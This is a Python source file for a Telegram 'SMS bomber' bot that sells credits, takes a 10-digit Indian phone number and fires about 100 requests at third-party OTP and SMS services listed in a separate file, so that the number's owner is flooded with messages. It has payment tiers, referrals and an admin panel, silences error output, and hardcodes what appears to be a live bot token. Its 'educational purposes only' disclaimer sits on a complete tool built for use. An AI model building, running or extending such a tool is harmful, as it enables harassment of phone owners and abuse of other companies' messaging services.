#!/usr/bin/env python
# ULTIMATE BOMBER BOT - FULLY FIXED
# (c) @lordzenox

import os, sys, json, time, random, threading, logging, requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ========== CONFIG ==========
BOT_TOKEN = "8996694548:AAF0ZA36jaUDkbkrKpcbqjxuppiX3YyyseY"
ADMIN_ID = 8112149031
OWNER = "@lordzenox"
CHANNEL1 = "@zenoxtool"
CHANNEL2 = "@Dev_Null_X_NODE_JS"
BOT_NAME = "ULTIMATE BOMBER"
BOT_VERSION = "v4.0"
BOMB_COST = 2
FREE_COINS = 5
MAX_SMS_PER_BOMB = 500

# ========== DISABLE LOGGING ==========
logging.basicConfig(level=logging.ERROR)
sys.stderr = open(os.devnull, 'w')

# ========== GLOBALS ==========
stop_bombing = {}

# ========== LOAD SERVICES ==========
def load_services():
    try:
        with open('services.json', 'r') as f:
            data = json.load(f)
            return data.get('services', [])
    except:
        return []

SERVICES = load_services()
print(f"✅ Loaded {len(SERVICES)} services")

# ========== DATABASE ==========
import sqlite3, random, string

DB_NAME = 'zenox_bomber.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        coins INTEGER DEFAULT 0, total_bombs INTEGER DEFAULT 0,
        total_sms INTEGER DEFAULT 0, referral_code TEXT UNIQUE,
        join_date TEXT, is_banned INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bomb_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        target TEXT, sms_count INTEGER, success INTEGER,
        failed INTEGER, date TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
        amount INTEGER, type TEXT, description TEXT, date TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(user_id, username, first_name):
    if get_user(user_id):
        return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    c.execute('''INSERT INTO users (user_id, username, first_name, coins, referral_code, join_date)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (user_id, username or first_name, first_name, FREE_COINS, ref_code, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return True

def get_balance(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else 0

def deduct_coins(user_id, amount):
    if amount <= 0: return False
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    if not user or user[0] < amount:
        conn.close()
        return False
    c.execute("UPDATE users SET coins = coins - ? WHERE user_id = ?", (amount, user_id))
    conn.commit()
    conn.close()
    return True

def add_bomb_stats(user_id, target, sms_count, success, failed):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET total_bombs = total_bombs + 1, total_sms = total_sms + ? WHERE user_id = ?",
              (sms_count, user_id))
    c.execute('''INSERT INTO bomb_logs (user_id, target, sms_count, success, failed, date)
        VALUES (?, ?, ?, ?, ?, ?)''',
        (user_id, target, sms_count, success, failed, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT coins, total_bombs, total_sms FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    if result:
        return {'coins': result[0], 'total_bombs': result[1], 'total_sms': result[2]}
    return None

def is_banned(user_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    return result and result[0] == 1

def get_all_users(limit=100):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id, username, coins, total_bombs, total_sms FROM users ORDER BY coins DESC LIMIT ?", (limit,))
    users = c.fetchall()
    conn.close()
    return users

# ========== BOMBING ENGINE ==========
def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91": return f"+91{p}"
    if fmt == "91-": return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc.get('method', 'POST').upper()
    url = svc.get('url', '').replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    if data:
        if '_raw' in data:
            raw = data['_raw'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
            try:
                import ast
                data = ast.literal_eval(raw)
            except:
                pass
        else:
            data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=2)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=2)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb_thread(phone, total, user_id, target_msg):
    global stop_bombing
    stop_bombing[user_id] = False
    services = SERVICES.copy()
    random.shuffle(services)
    sent = 0
    success = 0
    failed = 0

    while sent < total and not stop_bombing.get(user_id, False):
        for svc in services:
            if stop_bombing.get(user_id, False) or sent >= total:
                break
            try:
                ok = send_request(svc, phone)
                if ok:
                    success += 1
                else:
                    failed += 1
                sent += 1
            except:
                failed += 1
                sent += 1
            time.sleep(0.1)
            if sent % 10 == 0 or sent >= total:
                try:
                    progress = int((sent / total) * 100) if total > 0 else 0
                    msg = f"""🔄 **SENDING SMS...**

📱 Target: +91{phone}
📊 {progress}% | SENT: {sent} | ✅ {success} | ❌ {failed}

🛑 Type /stop to stop"""
                    target_msg.edit_text(msg, parse_mode="Markdown")
                except:
                    pass

    add_bomb_stats(user_id, phone, sent, success, failed)
    final_msg = f"""✅ **COMPLETE!**

📱 Target: +91{phone}
📊 Sent: {sent} | ✅ {success} | ❌ {failed}

📢 {CHANNEL1} | {CHANNEL2}"""
    try:
        target_msg.edit_text(final_msg, parse_mode="Markdown")
    except:
        pass

# ========== TELEGRAM BOT ==========
app = Application.builder().token(BOT_TOKEN).build()

# ========== START ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    if not get_user(user_id):
        create_user(user_id, user.username or user.first_name, user.first_name)

    coins = get_balance(user_id)
    stats = get_user_stats(user_id)

    msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""

    keyboard = [
        [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
        [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
         InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
        [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
         InlineKeyboardButton("🔗 REFER", callback_data="refer")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats"),
         InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
        [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
         InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
    ]

    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🔐 ADMIN PANEL", callback_data="admin_panel")])

    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ========== CALLBACK HANDLER ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data

    # ===== ADMIN PANEL (CALLBACK) =====
    if data == "admin_panel":
        if user_id != ADMIN_ID:
            await query.edit_message_text("❌ Unauthorized! Only admin can access.")
            return
        await query.edit_message_text(
            "🔐 **Admin Panel**\n\n"
            "/addcoins <user_id> <amount>\n"
            "/broadcast <message>\n"
            "/statsall - Full stats\n"
            "/ban <user_id>\n"
            "/unban <user_id>",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
        return

    # ===== SEND SMS =====
    if data == "send_sms":
        context.user_data['step'] = 'number'
        await query.edit_message_text(
            "📱 **Enter Target Number**\n\nSend the 10-digit phone number.\n\nExample: `9876543210`\n\n⏳ You have 60 seconds to reply.",
            parse_mode="Markdown"
        )
        return

    # ===== VIDEOS =====
    if data == "videos":
        await query.edit_message_text(f"📹 **Video Tutorials**\n\n📢 More videos on channel:\n{CHANNEL1}", parse_mode="Markdown")
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
        return

    # ===== CREDITS =====
    if data == "credits":
        coins = get_balance(user_id)
        stats = get_user_stats(user_id)
        msg = f"""💰 **Your Credits**

💳 **Balance:** {coins} credits
💣 **Bombs Used:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}"""
        keyboard = [
            [InlineKeyboardButton("🔗 Refer & Earn", callback_data="refer")],
            [InlineKeyboardButton("💳 Buy Credits", callback_data="buy_credits")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    # ===== REDEEM =====
    if data == "redeem":
        await query.edit_message_text(
            "🎁 **Redeem Code**\n\nApna redeem code yahan type karo:\n`/redeem <code>`\n\nExample: `/redeem TEST123`",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
        return

    # ===== REFER =====
    if data == "refer":
        ref_code = get_referral_code(user_id)
        if not ref_code:
            await query.edit_message_text("❌ Error getting referral code.")
            return
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={ref_code}"
        msg = f"""🔗 **Refer & Earn**

👤 **Your Referral Link:**
`{ref_link}`"""
        keyboard = [
            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join {BOT_NAME}!")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    # ===== STATS =====
    if data == "stats":
        stats = get_user_stats(user_id)
        coins = get_balance(user_id)
        msg = f"""📊 **Your Statistics**

👑 **Role:** {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
💰 **Credits:** {coins}
💣 **Total Bombs:** {stats['total_bombs']}
📱 **SMS Sent:** {stats['total_sms']}
📡 **APIs:** {len(SERVICES)}"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    # ===== HISTORY =====
    if data == "history":
        await query.edit_message_text("📜 **My SMS History**\n\nComing soon...")
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
        return

    # ===== BUY CREDITS =====
    if data == "buy_credits":
        msg = f"""💳 **Buy Credits**

👤 **Owner:** {OWNER}

💎 **Credit Prices:**
• **20 credits** - ₹40
• **50 credits** - ₹100
• **100 credits** - ₹190
• **250 credits** - ₹450
• **500 credits** - ₹850
• **1000 credits** - ₹1600

📩 Click below to contact owner!"""
        keyboard = [
            [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    # ===== TRANSFER =====
    if data == "transfer":
        await query.edit_message_text(
            "🔄 **Transfer Credits**\n\nUsage: `/transfer <user_id> <amount>`",
            parse_mode="Markdown"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
        return

    # ===== INFO =====
    if data == "info":
        msg = f"""ℹ️ **About {BOT_NAME}**

💀 **Version:** {BOT_VERSION}
👑 **Owner:** {OWNER}
📡 **APIs:** {len(SERVICES)}
📢 **Channels:** {CHANNEL1} | {CHANNEL2}

⚠️ **Disclaimer:** For educational purposes only."""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    # ===== BACK MAIN =====
    if data == "back_main":
        coins = get_balance(user_id)
        stats = get_user_stats(user_id)
        msg = f"""🔥 **{BOT_NAME}**
💀 **ULTIMATE SMS BOMBER {BOT_VERSION}**

👑 **Owner:** {OWNER}

- **ROLE**: {'ADMIN' if user_id == ADMIN_ID else 'FREE USER'}
- **CREDITS**: **{coins}**
- **USES**: **{stats['total_bombs']}**
- **APIS**: **{len(SERVICES)}**
- **SCANNER**: **{stats['total_sms']} DEVICES**

📢 **Channels:** {CHANNEL1} | {CHANNEL2}

💀 **TAP START TO BEGIN**"""
        keyboard = [
            [InlineKeyboardButton("💣 SEND SMS", callback_data="send_sms")],
            [InlineKeyboardButton("📹 VIDEOS", callback_data="videos"),
             InlineKeyboardButton("💰 CREDITS", callback_data="credits")],
            [InlineKeyboardButton("🎁 REDEEM", callback_data="redeem"),
             InlineKeyboardButton("🔗 REFER", callback_data="refer")],
            [InlineKeyboardButton("📊 STATS", callback_data="stats"),
             InlineKeyboardButton("📜 MY SMS HISTORY", callback_data="history")],
            [InlineKeyboardButton("💳 BUY CREDITS", callback_data="buy_credits"),
             InlineKeyboardButton("🔄 TRANSFER CREDITS", callback_data="transfer")],
            [InlineKeyboardButton("ℹ️ INFO", callback_data="info")],
        ]
        if user_id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton("🔐 ADMIN PANEL", callback_data="admin_panel")])
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

# ========== MESSAGE HANDLER ==========
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned.")
        return

    step = context.user_data.get('step', '')

    if step == 'number':
        phone = ''.join(filter(str.isdigit, text))
        if len(phone) >= 10:
            phone = phone[-10:]
            context.user_data['phone'] = phone
            context.user_data['step'] = None
            await update.message.reply_text(
                f"✅ **Number:** +91{phone}\n\n"
                f"💰 Credits Left: {get_balance(user_id)}\n"
                f"🔄 Starting bombing...",
                parse_mode="Markdown"
            )
            coins = get_balance(user_id)
            if coins < BOMB_COST:
                await update.message.reply_text(f"❌ Insufficient credits! Need {BOMB_COST} credits.")
                return
            if not deduct_coins(user_id, BOMB_COST):
                await update.message.reply_text("❌ Failed to deduct credits.")
                return
            stop_bombing[user_id] = False
            msg = f"""🔄 **SENDING SMS...**

📱 Target: +91{phone}
📊 Count: 100
🛑 Type /stop to stop."""
            msg_sent = await update.message.reply_text(msg, parse_mode="Markdown")
            def run_bomb():
                bomb_thread(phone, 100, user_id, msg_sent)
            threading.Thread(target=run_bomb, daemon=True).start()
        else:
            await update.message.reply_text("❌ Invalid number! Enter 10-digit number.")
    else:
        await update.message.reply_text("❌ Use /start to begin.")

# ========== COMMANDS ==========
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_bombing[user_id] = True
    await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    coins = get_balance(user_id)
    await update.message.reply_text(f"💰 **Balance:** {coins} credits", parse_mode="Markdown")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """📌 **Commands:**

/start - Main menu
/stop - Stop bombing
/balance - Check credits
/help - Show help
/admin - Admin panel"""
    await update.message.reply_text(msg, parse_mode="Markdown")

# ============================================================
# ADMIN COMMAND - DIRECT OPEN
# ============================================================
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Agar admin nahi hai toh unauthorised
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized! Only admin can access.")
        return
    
    # Admin hai toh panel open karo
    msg = """🔐 **Admin Panel**

/addcoins <user_id> <amount>
/broadcast <message>
/statsall - Full stats
/ban <user_id>
/unban <user_id>"""
    
    await update.message.reply_text(msg, parse_mode="Markdown")

# ============================================================
# ADMIN COMMANDS
# ============================================================
async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (amount, target_id))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    for uid, username, coins, bombs, sms in users:
        try:
            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
            sent += 1
            time.sleep(0.05)
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def statsall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT SUM(coins) FROM users")
    total_coins = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_bombs) FROM users")
    total_bombs = c.fetchone()[0] or 0
    c.execute("SELECT SUM(total_sms) FROM users")
    total_sms = c.fetchone()[0] or 0
    conn.close()
    msg = f"""📊 **Full Statistics**

👤 Users: {total_users}
💰 Coins: {total_coins}
💣 Bombs: {total_bombs}
📱 SMS: {total_sms}
📡 APIs: {len(SERVICES)}
👑 Owner: {OWNER}"""
    await update.message.reply_text(msg, parse_mode="Markdown")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"🚫 User `{target_id}` banned.", parse_mode="Markdown")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id!")
        return
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    await update.message.reply_text(f"✅ User `{target_id}` unbanned.", parse_mode="Markdown")

# ========== MAIN ==========
if __name__ == "__main__":
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("admin", admin))  # <--- DIRECT ADMIN COMMAND
    app.add_handler(CommandHandler("addcoins", addcoins))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("statsall", statsall))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("=" * 50)
    print(f"🤖 {BOT_NAME} ({BOT_VERSION})")
    print(f"📊 Loaded {len(SERVICES)} APIs")
    print(f"👑 Owner: {OWNER}")
    print(f"📢 Channels: {CHANNEL1} | {CHANNEL2}")
    print("=" * 50)
    app.run_polling(drop_pending_updates=True)
